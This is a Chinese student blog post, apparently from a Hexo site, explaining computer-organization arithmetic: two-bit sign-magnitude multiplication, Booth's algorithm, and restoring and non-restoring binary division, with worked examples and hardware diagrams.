src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233344339.png"
alt="image-20220616233344339" />
<figcaption aria-hidden="true">image-20220616233344339</figcaption>
</figure>
<p>这段文字十分滴珍贵,但是是那种懂的人一看就懂,不懂的看了还是不懂(此名言出自计组老师gx)</p>
<p>啥意思呢?不妨从研究这个表的结构规则入手</p>
<p>可以发现,</p>
<p>1.当<span class="math inline">\(Y_{i+1}\)</span>固定时,<span
class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>具有对称结构,具体表现为:</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233605441.png"
alt="image-20220616233605441" />
<figcaption aria-hidden="true">image-20220616233605441</figcaption>
</figure>
<p>2.<span class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>联手的时候相当于<span
class="math inline">\(Y_{i+1}\)</span> <img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616233706177.png"
alt="image-20220616233706177" /></p>
<p>也就是说,<span class="math inline">\(Y_i\)</span>和<span
class="math inline">\(C\)</span>就有完全相同的地位,<span
class="math inline">\(Y_{i+1}\)</span>权为2, <span
class="math inline">\(Y_i\)</span>权为1,<span
class="math inline">\(C\)</span>的权也是1</p>
<p>而这种类似的结构我们在什么地方见过呢?全加器</p>
<blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/v2-9b6f89175b854c4c335a704982d3520f_r.jpg"
alt="一位全加器真值表" />
<figcaption aria-hidden="true">一位全加器真值表</figcaption>
</figure>
<p>全加器中<span
class="math inline">\(X,Y,C_{i-1}\)</span>三者具有轮换对称结构</p>
<p>而<span
class="math inline">\(C_{i-1}\)</span>表示的是低位向本位的进位开关,类比到原码两位乘法中,他就是低位计算时没擦干净的屁股</p>
<p>在这个全加器运算的时候,会同时考虑三路输入,将<span
class="math inline">\(X_i,Y_i,C_{i-1}\)</span>同时加起来,也就是在完成本回合的事物时,同时把上回合的屁股擦了</p>
<p>但是也可以设计成,<span
class="math inline">\(X_i+Y_i\)</span>先算好,然后将上回合的屁股<span
class="math inline">\(C_{i-1}\)</span>加上</p>
<p>设计固然可以这样设计,但是何必呢?算好的结果还需要保存一下然后才和<span
class="math inline">\(C_{i-1}\)</span>相加.</p>
<p>直接三个加起来不用保存中间结果并且更容易实现,岂不美哉</p>
</blockquote>
<p>就用全加器的思想考虑在原码两位乘法</p>
<p>C不也是低位向本位的进位吗?或者说,上一个回合留到本回合才能擦干净的屁股</p>
<p>在上个回合加4X,不就相当于在本回合加X吗?</p>
<p>处理上回合的屁股顶多在本回合加一个X,</p>
<p>要是本回合本来啥也不干,那么处理屁股,加上X就完了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235501743.png"
alt="image-20220616235501743" />
<figcaption aria-hidden="true">image-20220616235501743</figcaption>
</figure>
<p>要是本回合本来就应该加X,那么一块处理了,加上2X就完了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235511820.png"
alt="image-20220616235511820" />
<figcaption aria-hidden="true">image-20220616235511820</figcaption>
</figure>
<p>要是本回合本来应该加2X,加上屁股一个X,一共3X,只需要减一个X然后继续把屁股交给下一个回合</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235623070.png"
alt="image-20220616235623070" />
<figcaption aria-hidden="true">image-20220616235623070</figcaption>
</figure>
<p>要是本回合本来应该加3X,加上屁股一共四个X,可以加上左移两次的X,但是留一个屁股给下一回合加上也是相当于本回合加4X,还不用位移,岂不美哉</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235634096.png"
alt="image-20220616235634096" />
<figcaption aria-hidden="true">image-20220616235634096</figcaption>
</figure>
<p>如果上个回合没有留屁股(即C=0),则本回合只需要看<span
class="math inline">\(Y_1Y_0\)</span>脸色行事,不用擦屁股</p>
<p>如此这个法则表就不用死记硬背了</p>
<h4 id="手写模拟-1">手写模拟</h4>
<p><span
class="math inline">\(X=+0.100111,Y=-0.100111\)</span>用原码两位乘法求积</p>
<p>符号显然为1</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220616235859593.png"
alt="image-20220616235859593" />
<figcaption aria-hidden="true">image-20220616235859593</figcaption>
</figure>
<p>这个"符号位"是啥呢?</p>
<p>这确实是符号位,因为过程中有<span
class="math inline">\(-X\)</span>的行为.为啥要三个符号位呢?这个是人为规定的</p>
<p>因为两位乘每回合需要右移两位,那么符号位至少有两位,至于为什么是三位呢?</p>
<p>因为<strong>存在带符号右移</strong>的行为,右移两位之后符号位高两位是填充0呢还是填充1呢?</p>
<p>能不能全都填充0呢?诚如是则三个符号位都是摆设,编课本的人也不用编了.多此一举何必呢?</p>
<p>这符号位的最高位起一个提示的作用,如果最高位为1则右移的时候最高位也补1,否则补0</p>
<p>因此最高位完全是个人爱好添加的,因为只要是最高位是1,则符号位的第二位也是1,完全可以根据第二位的提示填充符号位的高两位</p>
<p>这里就有问题了,为什么会有带符号右移?原码一位乘法的时候明明没有带符号右移啊?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617000021929.png"
alt="image-20220617000021929" />
<figcaption aria-hidden="true">image-20220617000021929</figcaption>
</figure>
<p>因为过程中确实有<span
class="math inline">\(-X\)</span>这种行为,通过加补实现,而补码的符号位就是负数.</p>
<p>如果无符号右移,则本回合<span
class="math inline">\(-X\)</span>在右移后进入下回合时,符号位也跟着移到右侧,这个<span
class="math inline">\(-X\)</span>成了加一个数,失去减法的意义并且导致错误</p>
<h2 id="补码一位乘法--布斯法">补码一位乘法--布斯法</h2>
<h3 id="推导算法原理">推导算法原理</h3>
<p>令<span
class="math inline">\(X=X_0.X_{-1}X_{-2}...X_{-(n-1)}\)</span>,<span
class="math inline">\(Y=Y_0.Y_{-1}Y_{-2}...Y_{-(n-1)}\)</span></p>
<p>将<span class="math inline">\(Y\)</span>按照权位展开 <span
class="math display">\[
\begin{aligned}
Y&amp;=Y_0.Y_{-1}Y_{-2}...Y_{-(n-1)}\\
&amp;=Y_0\times 2^0+Y_{-1}\times 2^{-1}+Y_{-2}\times
2^{-2}+...+Y_{-(n-1)}\times 2^{-(n-1)}\\
&amp;=Y_0(2^1-2^0)+Y_{-1}\times(2^0-2^{-1})+Y_{-2}\times
(2^{-1}-2^{-2})+...+Y_{-(n-1)}\times (2^{-(n-2)}-2^{-(n-1)})\\
&amp;=2Y_0+2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})
\end{aligned}
\]</span> 其中<span class="math inline">\(Y_0\)</span>是符号位,当<span
class="math inline">\(Y_0=0\)</span>,<span
class="math inline">\(2Y_0=0\)</span>,可以忽略</p>
<p>当<span class="math inline">\(Y_1=1\)</span>,<span
class="math inline">\(2Y_1=10\)</span>进位不管,本位还是<span
class="math inline">\(0\)</span>,也可以忽略</p>
<p>那么<span
class="math inline">\(Y=2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(0-Y_{-(n-1)})\)</span></p>
<p>不妨令<span class="math inline">\(Y\)</span>最后再加一位<span
class="math inline">\(Y_{-n}=0\)</span>反正小数部分最后添0不会影响小数大小</p>
<p>那么 <span class="math display">\[
\begin{aligned}
Y&amp;=2^0(Y_{-1}-Y_0)+2^{-1}(Y_{-2}-Y_1)+2^{-2}(Y_{-3}-Y_{-2})+...+2^{-(n-2)}(Y_{-(n-1)}-Y_{-(n-2)})+2^{-(n-1)}(Y_{-n}-Y_{-(n-1)})\\
&amp;=\sum_{i=-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)
\end{aligned}
\]</span> 好了,现在<span
class="math inline">\(Y\)</span>经过各种调教,已经连同符号位都可以一起计算了
<span class="math display">\[
\begin{aligned}
X\times Y&amp;=X\times \sum_{i=-(n-1)}^{0}2^{i}\times (Y_{i-1}-Y_i)\\
&amp;=\sum_{i=-(n-1)}^{0}[2^{i}\times (Y_{i-1}-Y_i)\times X]
\end{aligned}
\]</span> 这是一种啥形式呢?每次<span
class="math inline">\(X\)</span>都看<span
class="math inline">\(Y_{i-1}Y_{i}\)</span>的脸色行事,<span
class="math inline">\(2^i\)</span>是这俩哥们儿的权重.此时不再考虑<span
class="math inline">\(Y_{i-1},Y_{i}\)</span>的权重区别了,因为<span
class="math inline">\(2^i\)</span>是两个家伙的共同的权重,两者权重的二倍关系,已经应用在在刚才的转化过程中</p>
<table>
<thead>
<tr>
<th><span class="math inline">\(Y_{i-1}Y_{i}\)</span></th>
<th><span class="math inline">\(Y_{i-1}-Y_{i}\)</span></th>
<th>行为</th>
</tr>
</thead>
<tbody>
<tr>
<td>00</td>
<td>0</td>
<td>啥也不干</td>
</tr>
<tr>
<td>01</td>
<td>-1</td>
<td>-X</td>
</tr>
<tr>
<td>10</td>
<td>1</td>
<td>+X</td>
</tr>
<tr>
<td>11</td>
<td>0</td>
<td>啥也不干</td>
</tr>
</tbody>
</table>
<p>在一个回合内应该干的事情:</p>
<p>从<span
class="math inline">\(i=-(n-1)\)</span>这个最低权位开始算,每次根据<span
class="math inline">\(Y\)</span>的最低两位确定行为,然后右移一位,将<span
class="math inline">\(Y_i\)</span>移出扬了,刚才的<span
class="math inline">\(Y_{i-1}\)</span>现在是最低位.</p>
<p>每个回合开始前,将上回合的中间过程位向量右移一位,作用是给先前的计算结果都降权2</p>
<h3 id="硬件实现">硬件实现</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081422674.png"
alt="image-20220617081422674" />
<figcaption aria-hidden="true">image-20220617081422674</figcaption>
</figure>
<p>这个图应该怎样理解呢?</p>
<p>D和A两个寄存器共同组成中间过程位向量,最右边有一个<span
class="math inline">\(A_{-1}\)</span>是附加位,这个刚才我们也分析过了,小数部分最后随便添0不影响结果大小</p>
<p>一开始的时候,乘数<span
class="math inline">\(Y\)</span>符号位和数值位都放在A中,小数点扬了,<span
class="math inline">\(Y\)</span>的最低位落到<span
class="math inline">\(A_0\)</span>,此时<span
class="math inline">\(A_{-1}=0,D=0\)</span></p>
<p>右移的时候<span
class="math inline">\(A_{-1}\)</span>也要参与,刚才的<span
class="math inline">\(A_0\)</span>就移入<span
class="math inline">\(A_{-1}\)</span>,一共右移多少次呢?将A中的乘数刚好扬了为止,比如<span
class="math inline">\(Y=1.0011\)</span>则右移5次(符号位和数值为没有区别)</p>
<p><span
class="math inline">\(A_0A_{-1}\)</span>接入一个二四译码器,而实际上一共有三种情况,啥也不干,+X,-X,怎么把这三种情况转化成机器能听懂的语言呢?</p>
<p>当<span class="math inline">\(A_0A_{-1}=00\)</span>则选择器选通<span
class="math inline">\(D_0=0\)</span></p>
<p>当<span class="math inline">\(A_0A_-1=01\)</span>则选择器选通<span
class="math inline">\(D_1={B}\)</span></p>
<p>当<span class="math inline">\(A_0A_{-1}=10\)</span>则选择器选通<span
class="math inline">\(D_2=\overline {B}\)</span>,此时<span
class="math inline">\(A_0\overline
A_{-1}\)</span>接入与门,与门接到全加器最低位,作用是对<span
class="math inline">\(B\)</span>的取反再+1得到补码</p>
<p>当<span class="math inline">\(A_0A_{-1}=11\)</span>则选择器选通<span
class="math inline">\(D_3=0\)</span></p>
<p>选通信号都输入全加器</p>
<p>中间过程位向量<span
class="math inline">\([D:A]\)</span>在右移的时候带符号右移,即<span
class="math inline">\(CF\)</span>跟着移入最高位,并且右移之后<span
class="math inline">\(CF\)</span>状态不变</p>
<h3 id="手算模拟">手算模拟</h3>
<p><span
class="math inline">\(X=0.1010,Y=-0.1101\)</span>,计算两个数的补码一位布斯乘法</p>
<p><span class="math inline">\([X]_补=00.1010\)</span></p>
<p><span class="math inline">\([Y]_补=11.0011\)</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617081351470.png"
alt="image-20220617081351470" />
<figcaption aria-hidden="true">image-20220617081351470</figcaption>
</figure>
<p>最终没有特判符号位,而是符号位已经在CF中了</p>
<p>经过刚才的分析,现在<span
class="math inline">\(A_{-1}\)</span>就具有实际意义了,不再是一个根据人的意愿补上的一位了</p>
<p>每个回合,被乘数都根据<span
class="math inline">\(A_{0}A_{-1}\)</span>的脸色行事,比如当<span
class="math inline">\(A_0A_{-1}=10\)</span>时,应该-X</p>
<p>而这似乎和我们一开始推导算法的时候相反</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617084040120.png"
alt="image-20220617084040120" />
<figcaption aria-hidden="true">image-20220617084040120</figcaption>
</figure>
<p>我们推导的是当<span
class="math inline">\(Y_{i-1}Y_i=10\)</span>时+X</p>
<p>实际上令i=0得到<span
class="math inline">\(Y_{-1}Y_0=10\)</span>调个个儿就得到<span
class="math inline">\(Y_0Y_{-1}=01\)</span></p>
<p>因此<span
class="math inline">\(A_{0}A_{-1}=10\)</span>实际对应的是<span
class="math inline">\(Y_{i-1}Y_i=01\)</span>的情况,行为是-X</p>
<p>这里一定要分清关系</p>
<blockquote>
<p>在手算模拟的时候,只需要用<span
class="math inline">\(A_{-1}-A_0\)</span>,根据结果的正负决定加减X,<span
class="math inline">\(A_{-1}-A_0=1\)</span>则+X</p>
</blockquote>
<p>关于手算时符号位为啥要两位?</p>
<p>实际上机器只需要一位,这一位就有实际意义,即CF的值</p>
<p>然而由于计算过程中需要带符号右移一位,这样符号位是11时右移一位变成01,我们模拟时一看符号位还有1,于是高位填充1,修正成11</p>
<p>即最高位是防止人计算的过程中犯糊涂用的</p>
<p>并且符号位两位起到了双符号位判断溢出的作用,如果计算过程中,出现了两个符号位不同的情况,啃腚是算错了</p>
<h2 id="原码除法">原码除法</h2>
<h3 id="手算">手算</h3>
<p>约定规则</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617085630330.png"
alt="image-20220617085630330" />
<figcaption aria-hidden="true">image-20220617085630330</figcaption>
</figure>
<p>这个规则第一条我就绷不住了,就算是两个定点纯小数,被除数的绝对值也不一定比除数小吧,比如<span
class="math inline">\(0.1111\div 0.0111\)</span>,整数也是如此</p>
<p>那为啥要这样规定呢?为了保证两个定点纯小数的除法结果还是一个定点纯小数,</p>
<p>一旦被除数的绝对值大,则至少结果的整数部分可以商出一个1来,这时候运算结果就是定点既有整数也有小数了</p>
<p>而我们希望的是不使用整数部分,硬件上根本就不允许整数部分有意义,而是只保留小数部分</p>
<p>比如<span class="math inline">\(0.1111\div
0.0111=1.00010001..\)</span></p>
<p>而硬件是这样计算的:<span class="math inline">\(1111\div
0111=00010001\)</span>,因为硬件就认为这个结果只可能是小数</p>
<p>下面通过列竖式的方法计算<span
class="math inline">\(X=0.1011\)</span>,<span
class="math inline">\(Y=0.1101\)</span>两数的除法,推导适用于机器的算法</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617090654188.png"
alt="image-20220617090654188" />
<figcaption aria-hidden="true">image-20220617090654188</figcaption>
</figure>
<p>由于已经保证被除数绝对值小,因此结果的整数个位必定商0</p>
<p>人类在计算竖式的过程中有一个特点---人类会<strong>试商</strong>,啥意思呢?</p>
<p>在商了前两个1之后,下面要计算<span class="math inline">\(1010\div
1101\)</span>,</p>
<p>人类一看除数大,商1就过分了,剪出来一个负数,因此人类此时会商0.</p>
<blockquote>
<p>试商我们从小学就学过了,那时候是在十进制下,每次试商都要按照9,8,7,...,2,1,0这种顺序试商(熟练了可以用二分结果试商),直到试到某个值n,此时用n去乘被除数得到的积刚好比中间结果小或者相等整除,并且商<span
class="math inline">\(n+1\)</span>刚好比中间结果大,那么n就是该位应该上的商</p>
<p>而现在对于二进制,每一位只有两种状态0或者1,我们只需要试商1,成功则商1,失败则商0</p>
<p>本质思想是相同的,只不过二进制中商0和商1是相互对立事件,而十进制中商0和商1是互不相容事件,因为十进制下还可以商2,3,等等</p>
</blockquote>
<p>然而机器怎么试商呢?机器进行的每步运算都要改变硬件状态,试商会直接把商写进中间过程位向量,他只有一次机会,不允许试.而人类可以在草稿上试商然后将准确的商写道卷子上</p>
<h3 id="恢复余数法">恢复余数法</h3>
<p>虽然机器不能试商,但是机器可以知道的是,自己尚一个1,有没有商的太过分了,</p>
<p>商1,则用中间结果去减被除数,如果减出来结果是个负数,机器就能根据符号位知道发生了什么.</p>
<p>他知道刚才商的太狠了,本应该下手轻点的.</p>
<p>于是他可以反悔,刚才商1导致中间结果负了,那么现在改商0,中间结果再加一个被除数还原到商1之前的情况,刚才商的1不算数.这个过程叫做"<strong>恢复余数</strong>"</p>
<p>手算模拟<span
class="math inline">\(X=-0.10001011除以Y=0.0110\)</span>的过程</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617093100955.png"
alt="image-20220617093100955" />
<figcaption aria-hidden="true">image-20220617093100955</figcaption>
</figure>
<p>最终结果咋看呢?</p>
<p>看最后一行,</p>
<p>商的绝对值是<span
class="math inline">\(0.1001\)</span>,最前面这个0肯定是0,这就是整数位个位的商,由于被除数比除数小,因此这一位必定为0,商的结果根据除数和被除数的符号位异或决定,因此商是<span
class="math inline">\(1.1001\)</span></p>
<p>余数的绝对值是<span class="math inline">\(0.1101\times
2^{-4}\)</span>,符号应该和商一致,因此余数是<span
class="math inline">\(1.1101\times 2^{-4}\)</span></p>
<p>这里<span
class="math inline">\(2^{-4}\)</span>怎么来的呢?余数实际上是中间过程位向量最开始时的低四位经过运算和左移得到的,其本来的权就是<span
class="math inline">\(2^{-4}\)</span></p>
<p>为啥乘法的时候需要中间过程右移,而除法的时候需要中间过程左移呢?</p>
<p>在做除法的时候我们都是从高位往低位商,而做乘法的时候是从低位向高位乘,两种运算的顺序相反</p>
<p>做除法时早商应该比晚商权重高,通过左移,越早的商越高,权重越大</p>
<p>从图上可以发现一个问题,够减的时候,中间结果左移,不够减的时候,恢复余数,不左移</p>
<p>怎么让机器知道够不够减?前面分析的是根据符号位.</p>
<p>确实根据符号位可以知道这个事情,但是知道了怎么处理呢?</p>
<p>哪个元件可以根据CF的状态,决定给ALU送什么数呢?这个过程对硬件来说太抽象,不容易实现</p>
<p>想法总是千奇百怪,但是真到落地实现的时候,直接摔死</p>
<blockquote>
<p>这让我想到大二上学微信小程序的时候,我竟然痴心妄想整一个支持markdown,用缩进表示分支的思维导图(Flowchart).属实是高估自己的编程能力和知识储备了</p>
<p>然而本学期tx学写游戏的时候,一些听上去天马行空的事情,都被库函数实现了,只能说,人定胜天</p>
</blockquote>
<h3 id="加减交替法">加减交替法</h3>
<p>由于恢复余数法不方便实现,考虑一个让硬件舒服的方法</p>
<p>还是从恢复余数法中吸取教训</p>
<p>不妨定义一个说法"回合",感觉这像是一个状态机</p>
<p>每一回合都要经过,恢复余数(这算是上回合留下的屁股),左移一位,上本次的商,这几个过程</p>
<p>如果上回合留下了一个屁股,即上回合商1导致中间过程负了,本回合需要首先加上被除数恢复余数,并且上回合的商1作废,改为0,然后左移一位,让上回合的商升权2,然后直接商1,把屁股留给下一个回合</p>
<p>如果上回合没有留下屁股,即上回合商1,中间过程减去被除数得到正数,则不需要恢复余数,直接左移让上回合的商1升权2,然后直接商1把本回合的屁股留给下一个回合</p>
<p>好的, 现在考虑,</p>
<p>本回合需要处理上回合的屁股,首先R(中间过程结果)+Y(被除数),</p>
<p>然后左移一位,<span class="math inline">\(2(R+Y)\)</span></p>
<p>然后处理本回合事物,直接商1有<span
class="math inline">\(2(R+Y)-Y=2R+Y\)</span></p>
<p>这不就相当于刚才不擦屁股,直接余数R左移,然后加上Y吗</p>
<p>本回合不用擦上回合的屁股</p>
<p>直接R左移一位变成2R</p>
<p>然后处理本回合事物,直接商1有<span
class="math inline">\(2R-Y\)</span></p>
<p>综上,每个回合要么<span class="math inline">\(2R+Y\)</span>,要么<span
class="math inline">\(2R-Y\)</span>,总共两种状态,</p>
<p>通过中间过程符号位决定本回合采用哪种状态</p>
<p>啥时候上商呢?在回合开始还没有位移的时候,根据中间过程的符号上商,</p>
<p>中间过程符号为0则商1,中间过程符号为1则商0</p>
<p>这就好实现了,</p>
<p>2R相当于本回合上来就中间过程左移,</p>
<p>中间过程符号位作为地址端接到2选1选择器,</p>
<p>符号为1则<span
class="math inline">\(-Y\)</span>选通,并且还要向ALU最低位加一个1,实现加补操作</p>
<p>符号为0则<span class="math inline">\(+Y\)</span>选通</p>
<p>硬件实现如图</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617102424109.png"
alt="image-20220617102424109" />
<figcaption aria-hidden="true">image-20220617102424109</figcaption>
</figure>
<p>怎么解读这个框图呢?</p>
<p>以<span
class="math inline">\(X=-0.10001011,Y=0.1110\)</span>为例,</p>
<p><span class="math inline">\(|X|=0.10001011,|Y|=0.1110\)</span></p>
<p>一开始<span class="math inline">\(|X|\)</span>放在D和A中</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617103310655.png"
alt="image-20220617103310655" />
<figcaption aria-hidden="true">image-20220617103310655</figcaption>
</figure>
<p>第一回合,本回合比较特殊,当前中间过程就是被除数(绝对值),符号为正,但是商0</p>
<p>然后左移,刚才的符号位0取反后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=1\)</span>决定本回合-Y,即加Y补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104129464.png"
alt="image-20220617104129464" />
<figcaption aria-hidden="true">image-20220617104129464</figcaption>
</figure>
<p>第二回合,当前中间过程为<span
class="math inline">\(00&#39;00110110&#39;\)</span>,符号为正,商1</p>
<p>左移一位,符号位0取反之后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=1\)</span>决定本回合<span
class="math inline">\(-|Y|\)</span>,即加补</p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104639433.png"
alt="image-20220617104639433" />
<figcaption aria-hidden="true">image-20220617104639433</figcaption>
</figure>
<p>第三回合,当前中间过程为<span
class="math inline">\(11&#39;10001101\)</span>,符号为负,商1</p>
<p>左移一位,符号位1取反得0之后移入<span
class="math inline">\(A_0\)</span>,<span
class="math inline">\(A_0=0\)</span>决定本回合应该<span
class="math inline">\(+|Y|\)</span></p>
<p>得到新的中间过程</p>
<p>如下图描述</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617104826502.png"
alt="image-20220617104826502" />
<figcaption aria-hidden="true">image-20220617104826502</figcaption>
</figure>
<p>以此类推</p>
<p>最终结果怎么看呢?</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617105339564.png"
alt="image-20220617105339564" />
<figcaption aria-hidden="true">image-20220617105339564</figcaption>
</figure>
<p>商这一列从上到下就是商,最上面这个0不用管,每次都是0,原因是我们故意控制被除数绝对值比除数小</p>
<p>或者看最下面这一行最右边01001,就是商这一列不断右移得到的</p>
<p>余数绝对值<span class="math inline">\(0.1101\times
2^{-4}\)</span>,符号和商相同,都要看被除数和除数的符号异或</p>
<h2 id="补码除法">补码除法</h2>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110237294.png"
alt="image-20220617110237294" />
<figcaption aria-hidden="true">image-20220617110237294</figcaption>
</figure>
<p>这句话我看了好半天才看明白,</p>
<p>"与乘法运算的情况类似,有时也会<strong>迂回</strong>到补码乘法"</p>
<p>好家伙算个数还有迂回战术,就gx那三眼一板,一丝不苟的治学态度,我不大相信他能整出这样的词儿来</p>
<p>看了好几遍发现没有"回",就一个"迂",</p>
<p>是在说用补码做除法的人都<strong>迂</strong>吗?想到这里我都笑出了声,</p>
<p>用迂字骂人真有感觉,尤其和13合起来,"迂13!",这山东话绝对有气势</p>
<blockquote>
<p>巧了宿舍群就这样命名的</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617110800214.png"
alt="image-20220617110800214" />
<figcaption aria-hidden="true">image-20220617110800214</figcaption>
</figure>
</blockquote>
<p>应该是错字,本来想用"用"字的</p>
<p>绷不住了</p>
<h3 id="补码除法状态机">补码除法状态机</h3>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220617111542233.png"
alt="image-20220617111542233" />
<figcaption aria-hidden="true">image-20220617111542233</figcaption>
</figure>
<p><strong>状态</strong>就是被除数或者说余数,或者说中间过程位向量的符号状态,所有的状态转移都是根据该符号位决定的</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/impossible/page/6/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/impossible/">1</a><span class="space">&hellip;</span><a class="page-number" href="/impossible/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/impossible/page/8/">8</a><a class="page-number" href="/impossible/page/9/">9</a><a class="extend next" rel="next" href="/impossible/page/8/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="dustball"
      src="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
  <p class="site-author-name" itemprop="name">dustball</p>
  <div class="site-description" itemprop="description">dustland</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">37</span>
        <span class="site-state-item-name">tags</span>
      </div>
  </nav>
</div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">dustball</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/pjax/pjax.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>

  <script>
var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
